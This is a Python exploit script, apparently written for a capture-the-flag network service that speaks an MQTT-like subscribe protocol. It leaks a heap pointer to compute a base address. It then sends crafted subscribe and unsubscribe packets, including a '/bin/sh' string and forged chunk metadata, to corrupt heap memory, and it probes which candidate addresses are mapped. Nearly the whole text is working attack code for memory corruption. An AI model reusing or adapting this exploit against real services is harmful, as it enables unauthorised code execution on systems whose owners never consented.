import sys, time, socket, struct
import probe3 as P

def mapped(rel, gap=0.15):
    try:
        s=socket.create_connection((P.HOST,P.PORT),10)
    except Exception: return 'CONNERR'
    # phase 1: leak (pipelined is fine)
    s.sendall(P.build_leak()); time.sleep(3.0)
    buf=P.rd(s,1.5)
    i=buf.find(b'\x34\x2e\x00\x0cQWB2026_News'); leak=None
    if i>=0 and len(buf)>=i+2+0x2e:
        body=buf[i+2:i+2+0x2e]; tl=struct.unpack('>H',body[0:2])[0]
        pl=body[2+tl+2:]
        if len(pl)>=8: leak=struct.unpack('>Q',pl[:8])[0]
    if not leak: s.close(); return 'LEAKFAIL'
    BASE=leak-P.BIN2HEAP; tgt=BASE+rel
    # phase 2: send packet by packet, small gaps, no reads
    pkts=[P.subb('/bin/sh'),P.subb('d1xx'),P.subb('d2xx'),P.subb('Xx'),P.subb('Yy'),P.subb('Z'*400),
          P.unsubb('Yy'),P.unsubb('Xx')]
    pl2=bytearray(b'A'*272); pl2[24:32]=struct.pack('>Q',0x21); pl2[32:40]=struct.pack('>Q',tgt-16)
    pkts += [P.subb(raw=0xFFFF,pl=bytes(pl2)), P.subb('AAAA'), P.subb(struct.pack('>Q',tgt))]
    for p in pkts:
        s.sendall(p); time.sleep(gap)
    time.sleep(3.0)
    out=P.rd(s,2.5); s.close()
    n=out.count(b'\x90\x03\x00\x01\x01'); m=out.count(b'\xb0\x02\x00\x01')
    return ('MAPPED' if n>=9 else ('nomap' if n>=8 else 'short(%d)'%n))

if __name__=='__main__':
    for a in sys.argv[3:]:
        rel=int(a,16); print('rel=%s -> %s'%(a,mapped(rel)), flush=True)
